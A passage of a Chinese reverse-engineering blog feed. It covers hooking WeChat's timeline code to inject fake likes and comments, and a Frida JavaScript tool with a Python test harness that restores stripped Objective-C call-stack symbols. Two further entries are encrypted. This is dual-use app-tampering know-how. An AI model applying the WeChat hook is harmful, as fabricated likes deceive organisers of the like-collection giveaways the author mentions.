MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-08-01T07:53:10.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-08-01T07:52:05.503Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
